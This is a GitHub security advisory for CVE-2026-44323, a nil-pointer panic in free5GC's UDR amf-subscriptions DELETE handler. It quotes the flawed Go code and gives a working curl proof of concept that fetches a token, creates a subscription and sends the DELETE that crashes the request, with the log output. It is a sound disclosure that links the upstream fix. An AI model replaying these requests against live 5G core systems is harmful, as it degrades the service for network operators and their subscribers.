# [M] free5GC's UDR nudr-dr DELETE amf-subscriptions panics on missing subsId when UE state exists (nil pointer dereference)

## Summary
Severity: Medium
Advisory: GHSA-4rqf-grm6-vf75
CVE: CVE-2026-44323
CWE: CWE-476
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-4rqf-grm6-vf75
Type: github-advisory

## Affected
- Go: `github.com/free5gc/udr` — affected >=0 <1.4.3

## Details
### Summary
free5GC's UDR `nudr-dr` `DELETE /subscription-data/{ueId}/{servingPlmnId}/ee-subscriptions/{subsId}/amf-subscriptions` handler contains a nil-pointer dereference reachable from a single authenticated request, after one preparatory authenticated EE-subscription create. The handler checks `_, ok = UESubsData.EeSubscriptionCollection[subsId]` and sets a `404` problem-details on the miss path, but then continues to `UESubsData.EeSubscriptionCollection[subsId].AmfSubscriptionInfos` -- dereferencing the same missing entry instead of returning. Gin recovery converts the panic into `HTTP 500`, but the endpoint remains repeatedly panicable.

This endpoint requires a valid `nudr-dr` OAuth2 access token (i.e. PR:L, NOT PR:N), so this is scored as an authenticated panic-DoS, not as an unauth-bypass finding.

### Details
Validated against the UDR container in the official Docker compose lab.
- Source repo tag: `v4.2.1`
- Running Docker image: `free5gc/udr:v4.2.1`
- Runtime UDR commit: `754d23b0`
- Docker validation date: 2026-03-22
- UDR endpoint: `http://10.100.200.11:8000`

Precondition (one authenticated EE-subscription create allocates UE state):
```go
if !ok {
    udrSelf.UESubsCollection.Store(ueId, new(udr_context.UESubsData))
    value, _ = udrSelf.UESubsCollection.Load(ueId)
}
...
UESubsData.EeSubscriptionCollection[newSubscriptionID] = new(udr_context.EeSubscriptionCollection)
```

Vulnerable handler (delete on amf-subscriptions): the `ok` miss path sets `pd` but does not return, so the very next line dereferences the nil entry:
```go
_, ok = UESubsData.EeSubscriptionCollection[subsId]
if !ok {
    pd = util.ProblemDetailsNotFound("SUBSCRIPTION_NOT_FOUND")
}

if UESubsData.EeSubscriptionCollection[subsId].AmfSubscriptionInfos == nil {
    pd = util.ProblemDetailsNotFound("AMFSUBSCRIPTION_NOT_FOUND")
}
```
When `subsId` is absent, `UESubsData.EeSubscriptionCollection[subsId]` is nil, and `.AmfSubscriptionInfos` panics with `runtime error: invalid memory address or nil pointer dereference`.

Code evidence (paths in `free5gc/udr`):
- Precondition route + handler (EE-subscription create that allocates UE state):
  - `NFs/udr/internal/sbi/api_datarepository.go:600`
  - `NFs/udr/internal/sbi/api_datarepository.go:602`
  - `NFs/udr/internal/sbi/api_datarepository.go:2528`
  - `NFs/udr/internal/sbi/processor/event_exposure_subscriptions_collection.go:25`
  - `NFs/udr/internal/sbi/processor/event_exposure_subscriptions_collection.go:30`
  - `NFs/udr/internal/sbi/processor/event_exposure_subscriptions_collection.go:38`
- Vulnerable delete route + dispatch:
  - `NFs/udr/internal/sbi/api_datarepository.go:2161`
  - `NFs/udr/internal/sbi/api_datarepository.go:2172`
- Panic root cause (nil deref):
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:62`
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:64`
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:69`

### PoC
Reproduced end-to-end against the running UDR at `http://10.100.200.11:8000`.

1. Restart UDR (clean state):
```
docker restart udr
```

2. Obtain a valid `nudr-dr` token from NRF:
```
curl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=NEF&nfInstanceId=eb9990de-4cd3-41b0-b5d9-c2102b088c57&targetNfType=UDR&scope=nudr-dr'
```

3. Create one EE subscription to populate `UESubsCollection` for `ueId=x`:
```
curl -i -sS -X POST \
  'http://10.100.200.11:8000/nudr-dr/v2/subscription-data/x/context-data/ee-subscriptions' \
  -H 'Authorization: Bearer <valid_nudr_dr_jwt>' \
  -H 'Content-Type: application/json' \
  --data '{}'
```
```
HTTP/1.1 201 Created
```

4. Trigger the panic with a nonexistent `subsId`:
```
curl -i -sS -X DELETE \
  'http://10.100.200.11:8000/nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions' \
  -H 'Authorization: Bearer <valid_nudr_dr_jwt>'
```
```
HTTP/1.1 500 Internal Server Error
Content-Length: 0
```

5. UDR container logs (`docker logs udr`) confirm the nil-pointer panic at `event_amf_subscription_info_document.go:69` inside `RemoveAmfSubscriptionsInfoProcedure`:
```
[ERRO][UDR][GIN] panic: runtime error: invalid memory address or nil pointer dereference
github.com/free5gc/udr/internal/sbi/processor.(*Processor).RemoveAmfSubscriptionsInfoProcedure
    .../event_amf_subscription_info_document.go:69
github.com/free5gc/udr/internal/sbi.(*Server).HandleRemoveAmfSubscriptionsInfo
    .../api_datarepository.go:2172
[INFO][UDR][GIN] | 500 | DELETE | /nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions |
```

### Impact
NULL pointer dereference (CWE-476) in an authenticated UDR data-repository handler, caused by improper handling of the missing-subsId branch (CWE-754): the handler sets a problem-details value but does not return, then dereferences the same missing map entry.

This is NOT framed as an auth-bypass finding: the endpoint requires a valid `nudr-dr` OAuth2 access token. A network attacker who already holds (or can obtain) a valid token can:
- Trigger a reliable, repeatable nil-deref panic on the `amf-subscriptions` delete route after one preparatory POST that allocates UE state for the chosen `ueId`.
- Repeat the trigger to sustain a per-request panic-DoS on UDR's data-repository surface, with each panic costing more CPU + log writes than the intended `404 SUBSCRIPTION_NOT_FOUND` response would have.

No Confidentiality impact (the response is `500` with empty body; no UE data is returned to the attacker via the panic). No persistent Integrity impact from the panic itself (the EE subscription created during the precondition is in-memory state owned by UDR's intended data-repository semantics, and is not corrupted by the delete-time panic). Availability impact is limited to per-request degradation (Gin recovers; the UDR process keeps running).

Affected: free5gc v4.2.1.

Upstream issue: https://github.com/free5gc/free5gc/issues/919
Upstream fix: https://github.com/free5gc/udr/pull/60

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-4rqf-grm6-vf75
- https://nvd.nist.gov/vuln/detail/CVE-2026-44323
- https://github.com/free5gc/free5gc/issues/919
- https://github.com/free5gc/udr/pull/60
- https://github.com/free5gc/udr/commit/8a1d3c63be99d378806d771f086ff32f1867da99
- https://github.com/free5gc/free5gc
